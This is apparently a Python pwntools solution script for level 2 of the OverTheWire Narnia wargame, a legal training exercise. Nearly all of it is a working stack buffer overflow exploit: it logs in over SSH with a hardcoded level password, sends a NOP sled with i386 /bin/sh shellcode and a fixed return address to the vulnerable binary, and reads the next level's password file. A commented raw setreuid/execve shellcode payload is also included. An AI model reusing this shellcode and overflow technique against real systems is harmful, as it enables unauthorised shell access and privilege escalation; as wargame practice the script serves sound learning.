#!/usr/bin/env python
from pwn import *
from pygments import highlight
from pygments.lexers import CLexer
from pygments.formatters import TerminalFormatter

level = 2
user = 'narnia%s' % level
host = 'narnia.labs.overthewire.org'
password = 'nairiepecu'
port = 2226

# Working payload
#$(python -c "print '\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x31\xc0\xb0\x31\xcd\x80\x89\xc3\x89\xc1\x89\xc2\x31\xc0\xb0\xa4\xcd\x80\x31\xc0\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80' + '\x88\xd8\xff\xff'")

def connectToLevel():
    return ssh(user=user, host=host, port=port, password=password)

def getPass(shell):
    shell.sendline('cat /etc/narnia_pass/narnia%s' % (level+1))
    flag = shell.recvuntil('$').split()[0]
    log.info('Flag = %s' % flag)
    shell.close()
    return flag

def getCode(shell):
    code = shell.download_data('/narnia/' + user + '.c')
    shell.download_file('/narnia/' + user + '.c')
    log.info('Displaying code momentarily...')
    print highlight(code, CLexer(), TerminalFormatter(bg='dark'))

def makeShellCode():
    addr = 0xffffd888
    shellcode = asm('nop') * 96
    shellcode += asm(shellcraft.i386.sh())
    shellcode += p32(addr)
    return shellcode

context(arch='i386', os='linux', log_level='debug')
shellcode = makeShellCode()
sh = connectToLevel()

exe = sh.run("/narnia/%s" % user)
exe.sendline(shellcode)
exe.recvuntil('$')
flag = getPass(exe)
